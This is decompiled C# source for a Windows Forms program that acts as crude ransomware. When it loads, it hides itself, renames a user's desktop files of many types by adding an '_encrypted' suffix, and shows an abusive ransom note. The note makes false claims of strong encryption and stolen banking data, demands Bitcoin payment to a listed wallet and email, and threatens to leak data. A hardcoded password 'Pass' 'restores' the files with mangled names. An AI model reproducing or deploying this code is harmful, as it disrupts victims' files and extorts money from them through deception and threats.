using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApp24;

[DesignerGenerated]
public class Form1 : Form
{
	private string strmsg;

	private int i;

	private IContainer components;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Timer2")]
	internal virtual Timer Timer2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("NotifyIcon1")]
	internal virtual NotifyIcon NotifyIcon1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void renameTxTInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.txt";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameRaRInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.rar";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameLnKInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.lnk";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameUrLInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.url";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameZiPInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.zip";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renamePdFInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.pdf";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renamePNGInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.png";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameJPGInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.jpg";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameJPEGInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.jpeg";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renameRTFInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.rtf";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void renamedocxInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.docx";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + "_encrypted"));
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)GroupBox1).set_Visible(false);
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		Thread.Sleep(Conversions.ToInteger("5000"));
		renameTxTInFolder();
		renameJPEGInFolder();
		renameJPGInFolder();
		renameLnKInFolder();
		renamePdFInFolder();
		renamePNGInFolder();
		renameRaRInFolder();
		renameRTFInFolder();
		renameUrLInFolder();
		renameZiPInFolder();
		((Control)this).set_Visible(true);
		((Form)this).set_TopMost(true);
		strmsg = "Your files have been ecrypted with ransomware 256 bits encrypt secure sssl alorithm rot13..:" + Environment.NewLine + "your personil file have downloaded into my secure server buletprof. every important,borwser, cookes, games..." + Environment.NewLine + "i can restored you file open if you payed." + Environment.NewLine + " i encrypted files you can not open due ssl encrypt rot13 aes rijindael anlgorithm miltary file." + Environment.NewLine + Environment.NewLine + "how to restored my files back??" + Environment.NewLine + "and i will erase form my server jpg txt all externsion file secure shred wipe full double method." + Environment.NewLine + "email infornmatioen cotact dfercvypt files rot13 back nromal:" + Environment.NewLine + "my mail inqueres: crypt130@sharklasers.com" + Environment.NewLine + "cherk btc tarnseaction: 112Wz7NRWEMJC8jZv9Q3ru6xVBJjg8TRdD" + Environment.NewLine + "serach the btc into mail aders dectpyion software will sent on youmail perosnal." + Environment.NewLine + Environment.NewLine + "if you can turn pc of it will come back u fuck bithc no easpcae" + Environment.NewLine + "reemember your file encrypnt by me....." + Environment.NewLine + "contaoct to me th e decytpon price decrypt file price amount for btc wallet encrypt transacton " + Environment.NewLine + "i secrypt cheap for youu other is espensive do not pay other!!!...." + Environment.NewLine + " contact us. fast?" + Environment.NewLine + " negotiaite price: crypt130@sharklasers.com " + Environment.NewLine + Environment.NewLine + "If yuo not deside to pay ranson .faiel wl be shared deep web dark web hacker" + Environment.NewLine + "do you knouw tor?? is dep web aces avoid censoreship by all" + Environment.NewLine + "hacker sharcerdit card info and paswored and  bankging info" + Environment.NewLine + "quick!! paym now for files be erased secure secure removed from our server buletprof" + Environment.NewLine + "we ar kind with ofer wil notkeep you files forever if paeyd";
		Timer1.set_Enabled(true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		checked
		{
			i++;
			Label label;
			(label = Label1).set_Text(label.get_Text() + strmsg.Substring(i - 1, 1));
			if (i == strmsg.Length)
			{
				Timer1.set_Enabled(false);
				((Control)GroupBox1).set_Visible(true);
			}
		}
	}

	private void Label2_Click(object sender, EventArgs e)
	{
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "Pass", false) == 0)
		{
			Interaction.MsgBox((object)"Corect you must check decypt button it wuill decyrpt fiels for ", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"clcik the decyrpt buton now got started decytped files", (MsgBoxStyle)0, (object)null);
		}
		else
		{
			Interaction.MsgBox((object)"WARNGING wrong pasword", (MsgBoxStyle)0, (object)null);
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "Pass", false) == 0)
		{
			Interaction.MsgBox((object)"do not close, decrypt is happening. wait unttil", (MsgBoxStyle)0, (object)null);
			decryptdocxInFolder();
			decryptJPEGInFolder();
			decryptLnKInFolder();
			decryptPdFInFolder();
			decryptPNGInFolder();
			decryptRaRInFolder();
			decryptRTFInFolder();
			decryptTxTInFolder();
			decryptUrLInFolder();
			decryptZiPInFolder();
			Application.Exit();
		}
	}

	private void decryptTxTInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.txt_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".txt"));
		}
	}

	private void decryptRaRInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.rar_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".rar"));
		}
	}

	private void decryptLnKInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.lnk_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".lnk"));
		}
	}

	private void decryptUrLInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.url_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".url"));
		}
	}

	private void decryptZiPInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.zip_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".zip"));
		}
	}

	private void decryptPdFInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.pdf_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".pdf"));
		}
	}

	private void decryptPNGInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.png_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".png"));
		}
	}

	private void decryptJPGInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.jpg_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".jpg"));
		}
	}

	private void decryptJPEGInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.jpeg_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".jpeg"));
		}
	}

	private void decryptRTFInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.rtf_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".rtf"));
		}
	}

	private void decryptdocxInFolder()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string searchPattern = "*.docx_encrypted";
		string[] files = Directory.GetFiles(text, searchPattern, SearchOption.AllDirectories);
		foreach (string text2 in files)
		{
			File.Move(Path.Combine(text, text2), Path.Combine(text, text2 + ".docx"));
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		//IL_03d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03df: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		Label1 = new Label();
		Button1 = new Button();
		Button2 = new Button();
		GroupBox1 = new GroupBox();
		TextBox1 = new TextBox();
		Timer2 = new Timer(components);
		NotifyIcon1 = new NotifyIcon(components);
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.Lime);
		((Control)Label1).set_Location(new Point(12, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 13));
		((Control)Label1).set_TabIndex(0);
		((ButtonBase)Button1).set_BackColor(Color.Red);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)3);
		((Control)Button1).set_Location(new Point(83, 45));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(75, 23));
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("ddecrpy");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button2).set_BackColor(Color.Red);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)3);
		((Control)Button2).set_Location(new Point(6, 45));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(75, 23));
		((Control)Button2).set_TabIndex(3);
		((ButtonBase)Button2).set_Text(" check");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button1);
		((Control)GroupBox1).set_ForeColor(Color.White);
		((Control)GroupBox1).set_Location(new Point(569, 240));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(165, 74));
		((Control)GroupBox1).set_TabIndex(4);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("ransonware decyptt");
		((Control)TextBox1).set_Location(new Point(6, 19));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(152, 20));
		((Control)TextBox1).set_TabIndex(4);
		NotifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("NotifyIcon1.Icon"));
		NotifyIcon1.set_Text("NotifyIcon1");
		NotifyIcon1.set_Visible(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(746, 326));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("h");
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
